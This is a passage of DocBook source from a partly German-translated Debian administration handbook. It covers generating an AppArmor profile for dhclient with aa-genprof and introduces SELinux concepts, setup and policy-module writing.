  4 - #include &lt;abstractions/totem&gt; 
 [5 - /etc/nsswitch.conf]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>3</userinput>

Profile:  /sbin/dhclient
Path:     /etc/nsswitch.conf
Mode:     r
Severity: unknown

  1 - #include &lt;abstractions/apache2-common&gt; 
  2 - #include &lt;abstractions/libvirt-qemu&gt; 
 [3 - #include &lt;abstractions/nameservice&gt;]
  4 - #include &lt;abstractions/totem&gt; 
  5 - /etc/nsswitch.conf 
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding #include &lt;abstractions/nameservice&gt; to profile.

Profile:  /sbin/dhclient
Path:     /proc/7252/net/dev
Mode:     r
Severity: 6

  1 - /proc/7252/net/dev 
 [2 - /proc/*/net/dev]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding /proc/*/net/dev r to profile

[...]
Profile:  /sbin/dhclient <co id="aa-genprof-write"></co>
Path:     /run/dhclient-eth0.pid
Mode:     w
Severity: unknown

 [1 - /run/dhclient-eth0.pid]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>N</userinput>

Enter new path: /run/dhclient*.pid

Profile:  /sbin/dhclient
Path:     /run/dhclient-eth0.pid
Mode:     w
Severity: unknown

  1 - /run/dhclient-eth0.pid 
 [2 - /run/dhclient*.pid]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding /run/dhclient*.pid w to profile

[...]
Profile:  /usr/lib/NetworkManager/nm-dhcp-helper <co id="aa-genprof-other-profile"></co>
Path:     /proc/filesystems
Mode:     r
Severity: 6

 [1 - /proc/filesystems]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding /proc/filesystems r to profile

= Changed Local Profiles =

The following local profiles were changed. Would you like to save them?

 [1 - /sbin/dhclient]
  2 - /usr/lib/NetworkManager/nm-dhcp-helper 
(S)ave Changes / Save Selec(t)ed Profile / [(V)iew Changes] / View Changes b/w (C)lean profiles / Abo(r)t
<userinput>S</userinput>
Writing updated profile for /sbin/dhclient.
Writing updated profile for /usr/lib/NetworkManager/nm-dhcp-helper.

Profiling: /sbin/dhclient

[(S)can system log for AppArmor events] / (F)inish
<userinput>F</userinput>
Setting /sbin/dhclient to enforce mode.
Setting /usr/lib/NetworkManager/nm-dhcp-helper to enforce mode.

Reloaded AppArmor profiles in enforce mode.

Please consider contributing your new profile!
See the following wiki page for more information:
http://wiki.apparmor.net/index.php/Profiles

Finished generating profile for /sbin/dhclient.</computeroutput></screen>
      <para>
        Note that the program does not display back the control
        characters that you type but for the clarity of the explanation I
        have included them in the previous transcript.
      </para>
      <calloutlist>
        <callout arearefs="aa-genprof-execute">
          <para>
            The first event detected is the execution of another program.
            In that case, you have multiple choices: you can run the program
            with the profile of the parent process (the “Inherit” choice),
            you can run it with its own dedicated profile (the
            “Profile” and the “Named” choices, differing only by the
            possibility to use an arbitrary profile name), you can run it
            with a sub-profile of the parent process (the “Child” choice),
            you can run it without any profile (the “Unconfined” choice)
            or you can decide to not run it at all (the “Deny” choice).
          </para>
          <para>
            Note that when you opt to run it under a dedicated profile
            that doesn't exist yet, the tool will create the missing profile
            for you and will make rule suggestions for that profile in the
            same run.
          </para>
        </callout>
        <callout arearefs="aa-genprof-capability">
          <para>
            At the kernel level, the special powers of the root user have been split
            in “capabilities”. When a system call requires a specific capability,
            AppArmor will verify whether the profile allows the program to make
            use of this capability.
          </para>
        </callout>
        <callout arearefs="aa-genprof-read">
          <para>
            Here the program seeks read permissions for
            <filename>/etc/nsswitch.conf</filename>. <command>aa-genprof</command>
            detected that this permission was also granted by multiple
            “abstractions” and offers them as alternative choices. An
            abstraction provides a reusable set of access rules grouping
            together multiple resources that are commonly used together.
            In this specific case, the file is generally accessed through
            the nameservice related functions of the C library and we type
            “3” to first select the “#include
            &lt;abstractions/nameservice&gt;” choice and then “A” to allow
            it.
          </para>
        </callout>
        <callout arearefs="aa-genprof-write">
          <para>
            The program wants to create the <filename>/run/dhclient-eth0.pid</filename>
            file. If we allow the creation of this specific file only, the program
            will not work when the user will use it on another network interface.
            Thus we select “New” to replace the filename with the more generic
            “/run/dhclient*.pid” before recording the rule with “Allow”.
          </para>
        </callout>
        <callout arearefs="aa-genprof-other-profile">
          <para>
            Notice that this access request is not part of the dhclient
            profile but of the new profile that we created when we allowed
            <filename>/usr/lib/NetworkManager/nm-dhcp-helper</filename> to
            run with its own profile.
          </para>
          <para>
            After having gone through all the logged events, the program
            offers to save all the profiles that were created during the
            run. In this case, we have two profiles that we save at once
            with “Save” (but you can save them individually too) before
            leaving the program with “Finish”.
          </para>
        </callout>
      </calloutlist>
      <para>
        <command>aa-genprof</command> is in fact only a smart wrapper
        around <command>aa-logprof</command>: it creates an empty profile,
        loads it in complain mode and then run
        <command>aa-logprof</command> which is a tool to update a profile
        based on the profile violations that have been logged. So you can
        re-run that tool later to improve the profile that you just
        created.
      </para>
      <para>
        If you want the generated profile to be complete, you should use the
        program in all the ways that it is legitimately used. In the case
        of dhclient, it means running it via Network Manager, running it via
        ifupdown, running it manually, etc. In the end, you might get
        a <filename>/etc/apparmor.d/sbin.dhclient</filename> close to this:
      </para>
      <programlisting>
# Last Modified: Tue Sep  8 21:40:02 2015
#include &lt;tunables/global&gt;

/sbin/dhclient {
  #include &lt;abstractions/base&gt;
  #include &lt;abstractions/nameservice&gt;

  capability net_bind_service,
  capability net_raw,

  /bin/dash r,
  /etc/dhcp/* r,
  /etc/dhcp/dhclient-enter-hooks.d/* r,
  /etc/dhcp/dhclient-exit-hooks.d/* r,
  /etc/resolv.conf.* w,
  /etc/samba/dhcp.conf.* w,
  /proc/*/net/dev r,
  /proc/filesystems r,
  /run/dhclient*.pid w,
  /sbin/dhclient mr,
  /sbin/dhclient-script rCx,
  /usr/lib/NetworkManager/nm-dhcp-helper Px,
  /var/lib/NetworkManager/* r,
  /var/lib/NetworkManager/*.lease rw,
  /var/lib/dhcp/*.leases rw,

  profile /sbin/dhclient-script flags=(complain) {
    #include &lt;abstractions/base&gt;
    #include &lt;abstractions/bash&gt;

    /bin/dash rix,
    /etc/dhcp/dhclient-enter-hooks.d/* r,
    /etc/dhcp/dhclient-exit-hooks.d/* r,
    /sbin/dhclient-script r,

  }
}
      </programlisting>
    </section>
  </section>

  <section id="sect.selinux">
    <title>Einführung in SELinux</title>
    <indexterm><primary>SELinux</primary></indexterm>
    <section id="sect.selinux-principles">
      <title>Prinzipien</title>

      <para>SELinux (<emphasis>Security Enhanced Linux</emphasis>) ist ein System mit <emphasis>Mandatory Access Control</emphasis>, das auf der LSM-Schnittstelle (<emphasis>Linux Security Modules</emphasis>) von Linux aufbaut. In der Praxis befragt der Kernel SELinux vor jedem Systemaufruf, um herauszufinden, ob der Prozess autorisiert ist, den jeweiligen Vorgang auszuführen.</para>

      <para>SELinux verwendet einen Satz von Regeln - in ihrer Gesamtheit als <emphasis>Policy</emphasis> bezeichnet - um Vorgänge zu autorisieren oder zu verbieten. Diese Regeln sind schwierig zu erstellen. Glücklicherweise werden zwei Standardregelwerke (<emphasis>targeted</emphasis> und <emphasis>strict</emphasis>) bereitgestellt, die den Großteil der Konfigurierungsarbeit entbehrlich machen.</para>

      <para>Mit SELinux ist die Verwaltung der Berechtigungen grundsätzlich verschieden von traditionellen Unix-Systemen. Die Berechtigungen eines Prozesses hängen von seinem <emphasis>Sicherheitskontext</emphasis> ab. Der Kontext wird von der <emphasis>Identität</emphasis> des Benutzers bestimmt, der den Prozess gestartet hat, sowie von der <emphasis>Rolle</emphasis> und der <emphasis>Domain</emphasis>, die dem Benutzer zu dieser Zeit übertragen waren. Die Berechtigungen hängen tatsächlich von der Domain ab, aber die Übergänge zwischen den Domains werden von den Rollen kontrolliert. Und schließlich hängen die möglichen Übergänge zwischen den Rollen von der Identität ab.</para>

      <figure>
        <title>Sicherheitskontexte und Unix-Nutzer</title>
        <mediaobject>
          <imageobject>
            <imagedata fileref="images/selinux-context.png" scalefit="1" width="65%" />
          </imageobject>
        </mediaobject>
      </figure>

      <para>Konkret bekommt der Nutzer während der Anmeldung einen Standard-Sicherheitskontext zugewiesen (in Abhängigkeit von den Rollen, die er bestätigen können soll). Dies bestimmt die geltende Domain und damit auch die Domain, der alle neuen Unterprozesse zugeordnet werden. Wenn man die geltende Rolle und die ihr zugeordnete Domain ändern will, muss man den Befehl <command>newrole -r <replaceable>rolle_r</replaceable> -t <replaceable>domain_t</replaceable></command> aufrufen (normalerweise ist nur eine einzige Domain für eine bestimmte Rolle erlaubt, deshalb kann der Parameter <literal>-t</literal> häufig weggelassen werden). Dieser Befehl authentifiziert jemanden, indem er ihn auffordert, sein Passwort einzugeben. Dies hindert Programme daran, selbstständig ihre Rollen zu ändern. Derartige Änderungen sind nur möglich, wenn sie im SELinux-Regelwerk ausdrücklich erlaubt sind.</para>

      <para>Offensichtlich gelten die Berechtigungen nicht für alle <emphasis>Objekte</emphasis> (Dateien, Verzeichnisse, Sockets, Geräte usw.). Sie können von Objekt zu Objekt unterschiedlich sein. Um dies zu erreichen, ist jedes Objekt einem <emphasis>Typ</emphasis> zugeordnet (dies wird als Kennzeichnung bezeichnet). Die Rechte einer Domain werden somit durch Sätze von Operationen ausgedrückt, die bei diesen Typen erlaubt sind oder nicht (und indirekt bei allen Objekten, die mit dem jeweiligen Typ gekennzeichnet sind).</para>

      <sidebar>
        <title><emphasis>EXTRA</emphasis> Domains und Typen sind gleichwertig</title>

	<para>Intern ist eine Domain nur ein Typ, jedoch ein Typ, der nur für Prozesse gilt. Daher tragen Domains das Suffix <literal>_t</literal>, genau wie Objekttypen.</para>
      </sidebar>

      <para>Standardmäßig übernimmt ein Programm die Domain des Nutzers, der es gestartet hat, aber die normalen SELinux-Regeln erwarten, dass viele wichtige Programme in speziell für sie vorgesehenen Domains laufen. Um dies zu erreichen, werden diese ausführbaren Dateien mit einem fest zugeordneten Typ gekennzeichnet (zum Beispiel wird <command>ssh</command> mit <literal>ssh_exec_t</literal> gekennzeichnet, und wenn das Programm startet, wechselt es selbstständig in die Domain <literal>ssh_t</literal>). Dieser automatische Vorgang des Domainwechsels ermöglicht es, jedem Programm nur die Berechtigungen zu gewähren, die es benötigt. Dies ist ein wesentliches Prinzip von SELinux.</para>

      <figure>
        <title>Selbstständige Übergänge zwischen Domains</title>
        <mediaobject>
          <imageobject>
            <imagedata fileref="images/selinux-transitions.png" scalefit="1" width="35%" />
          </imageobject>
        </mediaobject>
      </figure>

      <sidebar>
        <title><emphasis>IN DER PRAXIS</emphasis> Den Sicherheitskontext finden</title>
        <indexterm><primary>Sicherheitskontext</primary></indexterm>
        <indexterm><primary>Kontext, Sicherheitskontext</primary></indexterm>
        <indexterm><primary>MCS (<emphasis>Multi-Category Security</emphasis>)</primary></indexterm>

	<para>Um den Sicherheitskontext eines bestimmten Prozesses festzustellen, kann die Option <literal>Z</literal> des Befehls <command>ps</command> verwendet werden.</para>

        <screen><computeroutput>$ </computeroutput><userinput>ps axZ | grep vstfpd</userinput>
<computeroutput>system_u:system_r:ftpd_t:s0   2094 ?    Ss  0:00 /usr/sbin/vsftpd</computeroutput></screen>

	<para>Das erste Feld enthält durch Doppelpunkte getrennt die Identität, die Rolle, die Domain und die MCS-Stufe. Die MCS-Stufe (<emphasis>Multi-Category Security</emphasis>) ist ein Parameter, der beim Aufbau einer Regel zum Schutz der Vertraulichkeit eingreift, die den Zugriff auf Dateien in Abhängigkeit von ihrer Sensibilität regelt. Dieses Leistungsmerkmal wird in diesem Buch nicht erläutert.</para>

	<para>Um in einer Konsole den aktuellen Sicherheitskontext festzustellen, kann man den Befehl <command>id -Z</command> aufrufen.</para>

        <screen><computeroutput>$ </computeroutput><userinput>id -Z</userinput>
<computeroutput>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</computeroutput></screen>

	<para>Um schließlich auch den Typ festzustellen, der einer Datei zugeordnet ist, kann man den Befehl <command>ls -Z</command> verwenden.</para>

        <screen><computeroutput>$ </computeroutput><userinput>ls -Z test /usr/bin/ssh</userinput>
<computeroutput>unconfined_u:object_r:user_home_t:s0 test
     system_u:object_r:ssh_exec_t:s0 /usr/bin/ssh</computeroutput></screen>

	<para>Man sollte beachten, dass die Identität und die Rolle, die einer Datei zugewiesen sind, keine besondere Bedeutung haben (sie werden nie benutzt), aber aus Gründen der Einheitlichkeit wird allen Objekten ein vollständiger Sicherheitskontext zugeordnet.</para>
      </sidebar>
    </section>
    <section id="sect.selinux-setup">
      <title>SELinux einrichten</title>

      <para>Die Unterstützung von SELinux ist in den von Debian bereitgestellten Standard-Kerneln enthalten. Die Kernprogramme von Unix unterstützen SELinux ohne Änderungen. Es ist daher recht einfach, SELinux zu aktivieren.</para>

      <para>Der Befehl <command>apt install selinux-basics selinux-policy-default</command> installiert selbstständig die zur Konfigurierung eines SELinux-Systems erforderlichen Pakete.</para>

      <sidebar>
        <title><emphasis>CAUTION</emphasis> Reference policy not in jessie</title>
        <para>
          Unfortunately the maintainers of the <emphasis role="pkg">refpolicy</emphasis> source package did not handle
          release critical bugs on their package and the package got
          removed from jessie. This means that the <emphasis role="pkg">selinux-policy-*</emphasis> packages are currently not
          installable in jessie and need to be fetched from another
          place. Hopefully they will come back in one of the point releases
          or in jessie-backports. In the meantime, you can grab them
          from unstable.
        </para>
        <para>
          This sad situation at least proves that SELinux is not very popular
          in the set of users/developers who are running the development
          versions of Debian. Thus, if you opt to use SELinux, you
          should expect the default policy to not work perfectly and
          you will have to invest quite some time to make it suitable
          to your specific needs.
        </para>
      </sidebar>

      <para>Das Paket <emphasis role="pkg">selinux-policy-default</emphasis> enthält einen Satz von Standardregeln. Standardmäßig beschränkt dieses Regelwerk nur den Zugang für einige besonders gefährdete Dienste. Die Nutzersitzungen sind nicht eingeschränkt, und es ist daher unwahrscheinlich, dass SELinux legitime Nutzeraktionen blockieren würde. Dieses erhöht jedoch die Sicherheit von Systemdiensten, die auf dem Rechner laufen. Um ein Regelwerk einzurichten, das den alten „strengen“ Regeln entspricht, müssen Sie nur das Modul <literal>unconfined</literal> deaktivieren (die Modulverwaltung wird in diesem Kapitel ausführlich beschrieben).</para>

      <para>Sobald das Regelwerk installiert ist, sollten Sie alle verfügbaren Dateien kennzeichnen (das heißt, sie einem Typ zuzuordnen). Dieser Vorgang muss mit dem Befehl <command>fixfiles relabel</command> von Hand gestartet werden.</para>

      <para>Das SELinux-System ist nun einsatzbereit. Um es zu aktivieren, sollten Sie den Parameter <literal>selinux=1 security=selinux</literal> zum Linux-Kernel hinzufügen. Der Parameter <literal>audit=1</literal> aktiviert bei SELinux das Protokollieren, durch das alle unterbundenen Vorgänge aufgezeichnet werden. Schließlich bringt der Parameter <literal>enforcing=1</literal> das Regelwerk zur Anwendung: ohne ihn läuft SELinux in seinem standardmäßigen <emphasis>permissive</emphasis>-Modus, bei dem unterbundene Vorgänge zwar protokolliert, aber dennoch ausgeführt werden. Sie sollten daher die Konfigurationsdatei des GRUB-Bootloaders anpassen, indem Sie die gewünschten Parameter anhängen. Ein einfacher Weg, dies zu tun, besteht darin, die Variable <literal>GRUB_CMDLINE_LINUX</literal> in der Datei <filename>/etc/default/grub</filename> zu ändern und dann den Befehl <command>update-grub</command> auszuführen. SELinux ist dann nach einem Neustart aktiv.</para>

      <para>Es sei darauf hingewiesen, dass das Skript <command>selinux-activate</command> diese Vorgänge automatisiert und das Kennzeichnen der Dateien beim nächsten Rechnerstart erzwingt (wodurch vermieden wird, dass neue nicht gekennzeichnete Dateien erstellt werden, während SELinux noch nicht aktiv ist und das Kennzeichnen noch andauert).</para>
    </section>
    <section id="sect.selinux-management">
      <title>Ein SELinux-System verwalten</title>
      <indexterm><primary><command>semodule</command></primary></indexterm>
      <indexterm><primary><command>semanage</command></primary></indexterm>

      <para>Das SELinux-Regelwerk ist ein modularer Satz von Regeln, und mit seiner Installierung werden automatisch alle relevanten Module entsprechend den bereits installierten Diensten erkannt und aktiviert. Das System ist hierdurch sofort funktionsfähig. Wenn jedoch ein Dienst später als das SELinux-Regelwerk installiert wird, müssen Sie in der Lage sein, das entsprechende Modul manuell zu aktivieren. Hierzu dient der Befehl <command>semodule</command>. Darüber hinaus müssen Sie in der Lage sein, die Rollen festzulegen, die jeder Nutzer bestätigen kann. Dies geschieht mit dem Befehl <command>semanage</command>.</para>

      <para>Diese beiden Befehle können somit dazu benutzt werden, die aktuelle SELinux-Konfiguration, die in <filename>/etc/selinux/default/</filename> gespeichert ist, zu ändern. Im Gegensatz zu anderen Konfigurationsdateien, die Sie in <filename>/etc/</filename> finden, dürfen diese Dateien nicht manuell verändert werden. Sie sollten hierzu die für diesen Zweck vorgesehenen Programme verwenden.</para>

      <sidebar>
        <title><emphasis>WEITERE SCHRITTE</emphasis> Weitere Unterlagen</title>

	<para>Da die NSA keine offiziellen Unterlagen bereitstellt, hat die Gemeinschaft zum Ausgleich ein Wiki eingerichtet. Es bündelt viele Informationen, jedoch müssen Sie sich bewusst sein, dass die meisten SELinux-Mitwirkenden Fedora-Benutzer sind (bei dem SELinux standardmäßig aktiviert ist). Die Dokumentation neigt daher dazu, sich vor allem mit dieser Distribution zu beschäftigen. <ulink type="block" url="http://www.selinuxproject.org" /></para>

	<para>Sie sollten auch einen Blick auf die entsprechende Debian-Wiki-Seite wie auch auf Russell Cokers Blog werfen, der einer der aktivsten an der SELinux-Unterstützung arbeitenden Debian-Entwickler ist. <ulink type="block" url="http://wiki.debian.org/SELinux" /> <ulink type="block" url="http://etbe.coker.com.au/tag/selinux/" /></para>
      </sidebar>
      <section>
        <title>SELinux-Module verwalten</title>

	<para>Verfügbare SELinux-Module sind im Verzeichnis <filename>/usr/share/selinux/default/</filename> gespeichert. Um eines dieser Module in der aktuellen Konfiguration zu aktivieren, sollten Sie den Befehl <command>semodule -i <replaceable>Modul.pp.bz2</replaceable></command> benutzen. Die Erweiterung <emphasis>pp.bz2</emphasis> steht für <emphasis>policy package</emphasis> (komprimiert mit bzip2).</para>

	<para>Removing a module from the current configuration is done with
	<command>semodule -r <replaceable>module</replaceable></command>.
	Finally, the <command>semodule -l</command> command lists the
	modules which are currently installed. It also outputs their version
        numbers. Modules can be selectively enabled with <command>semodule -e</command>
        and disabled with <command>semodule -d</command>.</para>

        <screen><computeroutput># </computeroutput><userinput>semodule -i /usr/share/selinux/default/abrt.pp.bz2</userinput>
<computeroutput># </computeroutput><userinput>semodule -l</userinput>
<computeroutput>abrt    1.5.0   Disabled
accountsd       1.1.0   
acct    1.6.0   
[...]</computeroutput>
<computeroutput># </computeroutput><userinput>semodule -e abrt</userinput>
<computeroutput># </computeroutput><userinput>semodule -d accountsd</userinput>
<computeroutput># </computeroutput><userinput>semodule -l</userinput>
<computeroutput>abrt    1.5.0
accountsd       1.1.0   Disabled
acct    1.6.0   
[...]</computeroutput>
<computeroutput># </computeroutput><userinput>semodule -r abrt</userinput>
<computeroutput># </computeroutput><userinput>semodule -l</userinput>
<computeroutput>accountsd       1.1.0   Disabled
acct    1.6.0   
[...]</computeroutput></screen>

	<para><command>semodule</command> lädt die neue Konfiguration unmittelbar, es sei denn, Sie verwenden seine Option <literal>-n</literal>. Es sei darauf hingewiesen, dass das Programm standardmäßig auf die aktuelle Konfiguration wirkt (die unter der Variablen <literal>SELINUXTYPE</literal> in der Datei <filename>/etc/selinux/config</filename> angegeben ist), aber Sie können eine andere ändern, indem Sie sie mit der Option <literal>-s</literal> vorgeben.</para>
      </section>
      <section>
        <title>Identitäten verwalten</title>

	<para>Jedes Mal, wenn sich ein Benutzer anmeldet, wird ihm eine SELinux-Identität zugewiesen. Diese bestimmt die Rollen, die er bestätigen kann. Diese beiden Zuordnungen (des Benutzers zur Identität und der Identität zu den Rollen) können mit dem Befehl <command>semanage</command> konfiguriert werden.</para>

	<para>Sie sollten auf jeden Fall die Handbuchseite <citerefentry><refentrytitle>semanage</refentrytitle><manvolnum>8</manvolnum></citerefentry> lesen, auch wenn die Befehlssyntax für alle verwalteten Konzepte tendenziell ähnlich ist. Sie werden Optionen finden, die für alle Unterbefehle gleich sind: <literal>-a</literal> zum Hinzufügen, <literal>-d</literal> zum Löschen, <literal>-m</literal> zum Ändern, <literal>-l</literal> zum Auflisten und <literal>-t</literal> zur Anzeige des Typs (oder der Domain).</para>

	<para><command>semanage login -l</command> führt die aktuellen Zuordnungen zwischen Benutzerkennungen und SELinux-Identitäten auf. Benutzer, die keinen ausdrücklichen Eintrag haben, erhalten die Identität, die im Eintrag <literal>__default__</literal> angegeben ist. Der Befehl <command>semanage login -a -s user_u <replaceable>benutzer</replaceable></command> ordnet die Identität <emphasis>user_u</emphasis> dem angegebenen Benutzer zu. Schließlich entfernt der Befehl <command>semanage login -d <replaceable>benutzer</replaceable></command> den Zuordnungseintrag, der an diesen Benutzer vergeben war.</para>

        <screen><computeroutput># </computeroutput><userinput>semanage login -a -s user_u rhertzog</userinput>
<computeroutput># </computeroutput><userinput>semanage login -l</userinput>
<computeroutput>
Login Name           SELinux User         MLS/MCS Range        Service

__default__          unconfined_u         SystemLow-SystemHigh *
rhertzog             user_u               SystemLow            *
root                 unconfined_u         SystemLow-SystemHigh *
system_u             system_u             SystemLow-SystemHigh *
# </computeroutput><userinput>semanage login -d rhertzog</userinput> </screen>

	<para><command>semanage user -l</command> führt die Zuordnungen zwischen den SELinux-Benutzeridentitäten und den erlaubten Rollen auf. Um eine neue Identität hinzuzufügen, ist es erforderlich, sowohl die entsprechenden Rollen als auch ein kennzeichnendes Präfix festzulegen, das dazu benutzt wird, einem Typ persönliche Dateien (<filename>/home/<replaceable>benutzer</replaceable>/*</filename>) zuzuordnen. Als Präfix muss <literal>user</literal>, <literal>staff</literal> oder <literal>sysadm</literal> gewählt werden. Das Präfix „<literal>staff</literal>“ ergibt Dateien des Typs „<literal>staff_home_dir_t</literal>“. Das Erstellen einer neuen SELinux-Benutzeridentität geschieht mit dem Befehl <command>semanage user -a -R <replaceable>rollen</replaceable> -P <replaceable>präfix</replaceable> <replaceable>identität</replaceable></command>. Schließlich kann eine SELinux-Benutzeridentität mit dem Befehl <command>semanage user -d <replaceable>identität</replaceable></command> entfernt werden.</para>

        <screen><computeroutput># </computeroutput><userinput>semanage user -a -R 'staff_r user_r' -P staff test_u</userinput>
<computeroutput># </computeroutput><userinput>semanage user -l</userinput>
<computeroutput>
                Labeling   MLS/       MLS/                          
SELinux User    Prefix     MCS Level  MCS Range             SELinux Roles

root            sysadm     SystemLow  SystemLow-SystemHigh  staff_r sysadm_r system_r
staff_u         staff      SystemLow  SystemLow-SystemHigh  staff_r sysadm_r
sysadm_u        sysadm     SystemLow  SystemLow-SystemHigh  sysadm_r
system_u        user       SystemLow  SystemLow-SystemHigh  system_r
test_u          staff      SystemLow  SystemLow             staff_r user_r
unconfined_u    unconfined SystemLow  SystemLow-SystemHigh  system_r unconfined_r
user_u          user       SystemLow  SystemLow             user_r
# </computeroutput><userinput>semanage user -d test_u</userinput>
</screen>
      </section>
      <section>
        <title>Dateikontexte, Ports und Boolesche Optionen verwalten</title>

	<para>Jedes SELinux-Modul stellt einen Satz von Dateibezeichnungsregeln zur Verfügung, aber es ist auch möglich, eigene Bezeichnungsregeln hinzuzufügen, um einen speziellen Fall abzudecken. Wenn Sie zum Beispiel möchten, dass der Webserver in der Lage ist, Dateien innerhalb der <filename>/srv/www/</filename>-Dateihierarchie zu lesen, könnten Sie <command>semanage fcontext -a -t httpd_sys_content_t "/srv/www(/.*)?"</command> gefolgt von <command>restorecon -R /srv/www/</command> ausführen. Der erste Befehl registriert die neue Bezeichnungsregel, und der zweite gleicht die Dateitypen gemäß den derzeitigen Bezeichnungsregeln an.</para>

	<para>Ebenso sind die TCP/UDP-Ports in einer Weise gekennzeichnet, die sicherstellt, dass nur die entsprechenden Daemons an ihnen Verbindungen annehmen können. Wenn Sie zum Beispiel möchten, dass der Web-Server am Port 8080 Verbindungen annehmen kann, sollten Sie den Befehl <command>semanage port -m -t http_port_t -p tcp 8080</command> ausführen.</para>

	<para>Einige SELinux-Module exportieren Boolesche Optionen, die Sie justieren können, um das Verhalten der Standardregeln zu ändern. Das Dienstprogramm <command>getsebool</command> kann dazu verwendet werden, diese Optionen anzusehen (<command>getsebool <replaceable>boolesche_option</replaceable></command> zeigt eine Option an und <command>getsebool -a</command> alle). Der Befehl <command>setsebool <replaceable>boolesche_option</replaceable> <replaceable>wert</replaceable></command> ändert den aktuellen Wert einer Booleschen Option. Die Option <literal>-P</literal> macht die Änderung dauerhaft, was bedeutet, dass der neue Wert zum Standard wird und über Neustarts hinaus erhalten bleibt. Das unten stehende Beispiel gewährt Web-Servern Zugriff auf Home-Verzeichnisse (dies ist nützlich, wenn Benutzer persönliche Websites in <filename>~/public_html/</filename> haben).</para>

        <screen><computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput>
<computeroutput>httpd_enable_homedirs --&gt; off
# </computeroutput><userinput>setsebool -P httpd_enable_homedirs on</userinput>
<computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput> 
<computeroutput>httpd_enable_homedirs --&gt; on</computeroutput></screen>
      </section>
    </section>
    <section id="sect.selinux-custom-rules">
      <title>Die Regeln anpassen</title>

      <para>Da das SELinux-Regelwerk modular ist, könnte es interessant sein, neue Module für (möglicherweise maßgefertigte) Anwendungen zu entwickeln, für die es diese noch nicht gibt. Diese neuen Module würden dann die <emphasis>Referenzrichtlinien</emphasis> ergänzen.</para>

      <para>Zur Erstellung neuer Module werden die Pakete <emphasis role="pkg">selinux-policy-dev</emphasis> und <emphasis role="pkg">selinux-policy-doc</emphasis> benötigt. Letzteres enthält die Dokumentation der Standardregeln (<filename>/usr/share/doc/selinux-policy-doc/html/</filename>) und Beispieldateien, die als Vorlagen für die Erstellung neuer Module verwendet werden können. Installieren Sie diese Dateien und untersuchen Sie sie genauer:</para>

      <screen><computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/Makefile.example Makefile</userinput>
<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.fc ./</userinput>
<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.if ./</userinput>
<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.te ./</userinput></screen>

      <para>The <filename>.te</filename> file is the most important one. It
      defines the rules. The <filename>.fc</filename> file defines the
      “file contexts”, that is the types assigned to files related to
      this module. The data within the <filename>.fc</filename> file are
      used during the file labeling step. Finally, the
      <filename>.if</filename> file defines the interface of the module:
      it is a set of “public functions” that other modules can use to
      properly interact with the module that you're creating.</para>
      <section>
        <title>Eine <filename>.fc</filename>-Datei schreiben</title>

	<para>Das Lesen des unten stehenden Beispiels sollte genügen, um die Struktur einer derartigen Datei zu verstehen. Sie können reguläre Ausdrücke verwenden, um denselben Sicherheitskontext mehreren Dateien zuzuordnen oder auch einem ganzen Verzeichnisbaum.</para>

        <example>
          <title><filename>beispiel.fc</filename>-Datei</title>

          <programlisting role="scale"># myapp executable will have:
# label: system_u:object_r:myapp_exec_t
# MLS sensitivity: s0
# MCS categories: &lt;none&gt;

/usr/sbin/myapp         --      gen_context(system_u:object_r:myapp_exec_t,s0)</programlisting>
        </example>
      </section>
      <section>
        <title>Eine <filename>.if</filename>-Datei schreiben</title>

	<para>In unten stehendem Beispiel kontrolliert die erste Schnittstelle („<literal>myapp_domtrans</literal>“), wer die Anwendung ausführen kann. Die zweite („<literal>myapp_read_log</literal>“) gewährt Schreibzugriff auf die Protokolldateien der Anwendung.</para>

	<para>Jede Schnittstelle muss einen gültigen Regelsatz erzeugen, der in eine <filename>.te</filename>-Datei eingegliedert werden kann. Sie sollten daher alle Typen, die Sie verwenden, festlegen (mit dem Makro <literal>gen_require</literal>) und Standardanweisungen benutzen, um Berechtigungen zu vergeben. Beachten Sie jedoch, dass Sie auch Schnittstellen benutzen können, die von anderen Modulen bereitgestellt werden. Der nächste Abschnitt gibt weitere Erläuterungen darüber, wie diese Berechtigungen ausgedrückt werden können.</para>

        <example>
          <title><filename>beispiel.if</filename>-Datei</title>

          <programlisting>## &lt;summary&gt;Myapp example policy&lt;/summary&gt;
## &lt;desc&gt;
##      &lt;p&gt;
##              More descriptive text about myapp.  The &lt;desc&gt;
##              tag can also use &lt;p&gt;, &lt;ul&gt;, and &lt;ol&gt;
##              html tags for formatting.
##      &lt;/p&gt;
##      &lt;p&gt;
##              This policy supports the following myapp features:
##              &lt;ul&gt;
##              &lt;li&gt;Feature A&lt;/li&gt;
##              &lt;li&gt;Feature B&lt;/li&gt;
##              &lt;li&gt;Feature C&lt;/li&gt;
##              &lt;/ul&gt;
##      &lt;/p&gt;
## &lt;/desc&gt;
#

########################################
## &lt;summary&gt;
##      Execute a domain transition to run myapp.
## &lt;/summary&gt;
## &lt;param name="domain"&gt;
##      Domain allowed to transition.
## &lt;/param&gt;
#
interface(`myapp_domtrans',`
        gen_require(`
                type myapp_t, myapp_exec_t;
        ')

        domtrans_pattern($1,myapp_exec_t,myapp_t)
')

########################################
## &lt;summary&gt;
##      Read myapp log files.
## &lt;/summary&gt;
## &lt;param name="domain"&gt;
##      Domain allowed to read the log files.
## &lt;/param&gt;
#
interface(`myapp_read_log',`
        gen_require(`
